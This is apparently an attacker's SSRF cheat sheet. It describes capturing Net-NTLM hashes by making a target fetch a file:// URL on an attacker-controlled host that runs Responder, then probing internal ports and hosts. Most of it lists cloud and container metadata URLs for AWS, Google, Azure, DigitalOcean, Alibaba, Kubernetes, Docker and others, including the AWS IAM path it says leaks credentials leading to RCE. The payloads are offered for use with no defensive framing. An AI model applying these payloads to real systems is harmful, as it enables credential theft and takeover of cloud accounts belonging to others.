Stealing Net NTLM Hashes : file://attacker's remote IP Running Responder
	1. Run responder on Attacker's server which turns on the SMB Server.
	2. Use file://attackercontrolled.com/xyz.txt which inturn would try to authenticate using NET-NTLM Credentials with attacker's SMB Server ran by Responder and we get the Net-NTML Hashes which we could crack offline.

PORT Scanning
	1. Differentiate Open/Closed ports based on response content or response time.

Internal Network Mapping.
	1. Differentiate existing/nonexisting IPs based on response content or response time.

Metadata API :
Usually applications are hosted on cloud based services such as Google, Digital Ocean, Alibaba, Amazon etc. These cloud providers also provides API endpoints which can be used to interact with the configuration, information extraction using these endpoints. Here is a list of few providers and their Metadata API.

Google, Digital Ocean, Alibaba, Amazon, Kubernetes, Docker, Azure
Amazon :
	http://169.254.169.254/latest/meta-data/
	http://169.254.169.254/latest/meta-data/iam/security-credentials/{rolename} Leaks AWS Credentials which can give read/write access to buckets/EC2 instances leading to RCE
	http://169.254.169.254/latest/meta-data/hostname
	http://169.254.169.254/latest/user-data
Google :
	http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
	http://169.254.169.254/computeMetadata/v1/
	http://metadata.google.internal/computeMetadata/v1/
	http://metadata/computeMetadata/v1/
	http://metadata.google.internal/computeMetadata/v1/instance/hostname
	http://metadata.google.internal/computeMetadata/v1/instance/id
	http://metadata.google.internal/computeMetadata/v1/project/project-id
Digital Ocean :
	http://169.254.169.254/metadata/v1.json
	http://169.254.169.254/metadata/v1/
	http://169.254.169.254/metadata/v1/id
	http://169.254.169.254/metadata/v1/user-data
	http://169.254.169.254/metadata/v1/hostname
	http://169.254.169.254/metadata/v1/region
Alibaba :
	http://100.100.100.200/latest/meta-data/
	http://100.100.100.200/latest/meta-data/instance-id
	http://100.100.100.200/latest/meta-data/image-id
Kubernetes :
	https://kubernetes.default.svc.cluster.local
	https://kubernetes.default
Docker :
	http://127.0.0.1:2375/v1.24/containers/json
Azure :
	http://169.254.169.254/metadata/instance?api-version=2017-04-02
	http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
Packetcloud:
	https://metadata.packet.net/userdata
OpenStack/RackSpace  :
	http://169.254.169.254/openstack
